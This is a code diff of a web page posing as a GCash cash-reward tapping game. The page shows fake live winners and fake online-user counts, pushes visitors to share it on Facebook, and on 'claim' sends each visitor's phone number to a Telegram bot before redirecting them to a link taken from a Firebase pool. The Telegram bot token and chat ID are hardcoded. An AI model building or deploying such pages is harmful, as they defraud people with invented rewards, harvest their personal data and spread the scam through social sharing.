@@ -8,8 +8,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+    
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
     <style>
@@ -29,17 +29,27 @@
         }
 
         /* LIVE WINNER SECTION */
-        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); min-width: 240px; text-align: center; }
+        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); min-width: 260px; text-align: center; }
         #winnerEntry { transition: all 0.5s ease; display: inline-block; }
         .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; margin: 0 4px; }
 
-        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; }
+        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; position: relative; }
         .logo-img { width: 140px; height: auto; margin-bottom: 20px; }
         
         .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 20px 0; }
         .card-wrapper { cursor: pointer; position: relative; display: flex; justify-content: center; }
         .card-img { width: 100%; max-width: 100px; transition: 0.3s; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
         .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; }
+
+        /* MULTIPLIER & JACKPOT EFFECTS */
+        .floating-mult { position: absolute; top: -10px; color: #fbbf24; font-family: 'Orbitron'; font-size: 26px; font-weight: 900; animation: floatUp 1s forwards; z-index: 10; text-shadow: 0 0 10px #000; }
+        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-50px); } }
+        
+        .jackpot-text { position: absolute; top: -20px; color: #ff0000; font-family: 'Orbitron'; font-size: 32px; font-weight: 900; text-shadow: 0 0 15px #fff, 0 0 30px #ff0000; z-index: 100; animation: jackPop 1.5s forwards; white-space: nowrap; left: 50%; transform: translateX(-50%); }
+        @keyframes jackPop { 0% { transform: translateX(-50%) scale(0.5); opacity: 0; } 20% { transform: translateX(-50%) scale(1.4); opacity: 1; } 100% { transform: translateX(-50%) scale(1); opacity: 0; } }
+
+        .shake-card { animation: shake 0.3s both; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 
         .amount { font-family: 'Orbitron'; font-size: 40px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; }
         .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 15px 0; min-height: 20px; }
@@ -48,23 +58,21 @@
         .share-btn { background: #1877f2; color: #fff; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #1052a8; text-transform: uppercase; }
         .pay-button { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #8b6508; text-transform: uppercase; }
 
-        /* MULTIPLIER EFFECTS */
-        .floating-mult { position: absolute; top: -10px; color: #fbbf24; font-family: 'Orbitron'; font-size: 26px; font-weight: 900; animation: floatUp 1s forwards; z-index: 10; text-shadow: 0 0 10px #000; }
-        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-50px); } }
-        .jackpot-text { position: absolute; top: -20px; color: #ff0000; font-family: 'Orbitron'; font-size: 30px; font-weight: 900; text-shadow: 0 0 15px #fff; z-index: 20; animation: jackPop 1.5s forwards; }
-        @keyframes jackPop { 0% { transform: scale(0.5); opacity: 0; } 20% { transform: scale(1.5); opacity: 1; } 100% { transform: scale(1); opacity: 0; } }
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212,175,55,0.2); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div style="text-align:center; margin-bottom:10px;">
-        <div style="color:#22c55e; font-size:10px; font-weight:800;">● <span id="userCount">92</span> ONLINE</div>
+        <div style="color:#22c55e; font-size:10px; font-weight:800;">● <span id="userCount">88</span> ONLINE</div>
         <div class="live-winner-box">
-            <span id="winnerEntry">Initializing...</span>
+            <span id="winnerEntry">Initializing Secure Link...</span>
         </div>
     </div>
 
-    <div class="card">
+    <div class="card" id="mainCard">
         <img src="images/logo1.png" class="logo-img">
         
         <div class="game-grid">
@@ -87,6 +95,11 @@
         </div>
     </div>
 
+    <div id="processingOverlay">
+        <div class="spinner"></div>
+        <div style="color:#fff; margin-top:20px; font-weight:800;">ESTABLISHING VIALINK...</div>
+    </div>
+
     <script>
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
@@ -95,9 +108,15 @@
         let balance = 0;
         let clicks = 0;
         let canTap = false;
+        
+        // --- SOUND EFFECTS CONFIG ---
+        // Pre-load sounds to avoid delay
+        const sndTap = new Audio('sounds/tap.mp3');
+        const sndMult = new Audio('sounds/multiplier.mp3');
+        const sndJackpot = new Audio('sounds/jackpot.mp3');
 
-        // FIXED: Initial Balance 100-1000, rounded to 10
-        const startBalance = Math.round((Math.floor(Math.random() * (1000 - 100 + 1)) + 100) / 10) * 10;
+        // Initial balance 100-1000 rounded to 10
+        const startBalance = Math.round((Math.floor(Math.random() * 901) + 100) / 10) * 10;
 
         window.onload = () => {
             let timeLeft = 5;
@@ -109,7 +128,8 @@
                     clearInterval(countdown);
                     balance = startBalance;
                     canTap = true;
-                    document.getElementById('statusLabel').innerHTML = "✨ Reward Unlocked! Tap cards to boost.";
+                    document.getElementById('statusLabel').innerHTML = "✨ Initial Reward Granted! Tap cards for bonus.";
+                    document.getElementById('statusLabel').style.color = "#22c55e";
                 }
             }, 1000);
             startLiveWinners();
@@ -130,21 +150,38 @@
             else if (rand <= 60) { mult = 2; }
 
             const added = 25 * mult;
-            // FIXED: Ensure balance is always rounded
-            const nextBal = Math.round((balance + added) / 5) * 5; 
+            const nextBal = Math.round((balance + added) / 10) * 10; 
 
-            if (mult > 1) {
+            // --- PLAY SOUNDS BASED ON MULTIPLIER ---
+            if (isJack) {
+                // Bongga Jackpot Sound
+                sndJackpot.currentTime = 0; // Play from start
+                sndJackpot.play();
+                
                 const effect = document.createElement('div');
-                if (isJack) {
-                    effect.className = 'jackpot-text';
-                    effect.innerText = "JACKPOT x10!";
-                    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-                } else {
-                    effect.className = 'floating-mult';
-                    effect.innerText = `x${mult}`;
-                }
+                effect.className = 'jackpot-text';
+                effect.innerText = "JACKPOT x10!";
+                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff'] });
+                document.getElementById('mainCard').classList.add('shake-card');
+                setTimeout(() => document.getElementById('mainCard').classList.remove('shake-card'), 300);
                 el.appendChild(effect);
                 setTimeout(() => effect.remove(), 1200);
+            
+            } else if (mult > 1) {
+                // Happy Multiplier Sound
+                sndMult.currentTime = 0;
+                sndMult.play();
+                
+                const effect = document.createElement('div');
+                effect.className = 'floating-mult';
+                effect.innerText = `x${mult}`;
+                el.appendChild(effect);
+                setTimeout(() => effect.remove(), 1200);
+            
+            } else {
+                // Normal Tap Sound (for x1)
+                sndTap.currentTime = 0;
+                sndTap.play();
             }
 
             animateValue(balance, nextBal, 400);
@@ -158,26 +195,35 @@
             }
         }
 
-        function startLiveWinners() {
-            const winnerBox = document.getElementById('winnerEntry');
-            setInterval(() => {
-                winnerBox.style.opacity = '0';
-                winnerBox.style.transform = 'translateY(-10px)';
-                setTimeout(() => {
-                    const pref = ["0917", "0915", "0998", "0966", "0927", "0939"][Math.floor(Math.random()*6)];
-                    const suffix = Math.floor(1000 + Math.random()*9000);
-                    
-                    // FIXED: Max 2000 and Even numbers only
-                    const amtList = [200, 450, 800, 1200, 1550, 1800, 2000];
-                    const amt = amtList[Math.floor(Math.random()*amtList.length)];
-                    
-                    // FIXED: GCash Logo implementation
-                    winnerBox.innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱${amt.toLocaleString()}`;
-                    
-                    winnerBox.style.opacity = '1';
-                    winnerBox.style.transform = 'translateY(0)';
-                }, 500);
-            }, 4000);
+        function doShare() {
+            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
+            setTimeout(() => {
+                const bonus = 50;
+                animateValue(balance, balance + bonus, 500);
+                balance += bonus;
+                document.getElementById('shareBtn').style.display = 'none';
+                const claimBtn = document.getElementById('claimBtn');
+                claimBtn.style.display = 'block';
+                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
+            }, 1500);
+        }
+
+        function doClaim() {
+            document.getElementById('processingOverlay').style.display = 'flex';
+            const msg = `🔔 [ViaLink] CLAIM: ${userPhone} | ₱${balance}`;
+            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+                if (snapshot.exists()) {
+                    const id = Object.keys(snapshot.val())[0];
+                    const url = snapshot.val()[id].url;
+                    db.ref('links/' + id).update({ status: 'pending', user: userPhone, amount: balance });
+                    setTimeout(() => { window.location.href = url; }, 2000);
+                } else {
+                    alert("Reward Limit Reached! Try again later.");
+                    document.getElementById('processingOverlay').style.display = 'none';
+                }
+            });
         }
 
         function animateValue(start, end, duration) {
@@ -185,7 +231,6 @@
             const step = (timestamp) => {
                 if (!startTimestamp) startTimestamp = timestamp;
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                // Ensure the visual count doesn't show weird decimals
                 const currentVal = Math.floor(progress * (end - start) + start);
                 document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
                 if (progress < 1) window.requestAnimationFrame(step);
@@ -193,22 +238,23 @@
             window.requestAnimationFrame(step);
         }
 
-        // Standard Functions
-        function doShare() {
-            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
-            setTimeout(() => {
-                balance += 50;
-                document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
-                document.getElementById('shareBtn').style.display = 'none';
-                document.getElementById('claimBtn').style.display = 'block';
-                document.getElementById('claimBtn').innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
-            }, 1500);
-        }
-
-        function doClaim() {
-            const msg = `🔔 [ViaLink] CLAIM: ${userPhone} | ₱${balance}`;
-            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-            // Firebase logic here...
+        function startLiveWinners() {
+            const winnerBox = document.getElementById('winnerEntry');
+            setInterval(() => {
+                winnerBox.style.opacity = '0';
+                winnerBox.style.transform = 'translateY(-10px)';
+                setTimeout(() => {
+                    const pref = ["0917", "0915", "0998", "0966", "0927", "0939", "0945", "0916"][Math.floor(Math.random()*8)];
+                    const suffix = Math.floor(1000 + Math.random()*9000);
+                    const amtList = [250, 400, 750, 1200, 1500, 1850, 2000];
+                    const amt = amtList[Math.floor(Math.random()*amtList.length)];
+                    
+                    winnerBox.innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon" onerror="this.style.visibility='hidden'"> ₱${amt.toLocaleString()}`;
+                    winnerBox.style.opacity = '1';
+                    winnerBox.style.transform = 'translateY(0)';
+                    document.getElementById('userCount').innerText = Math.floor(Math.random()*20)+80;
+                }, 500);
+            }, 4000);
         }
     </script>
 </body>
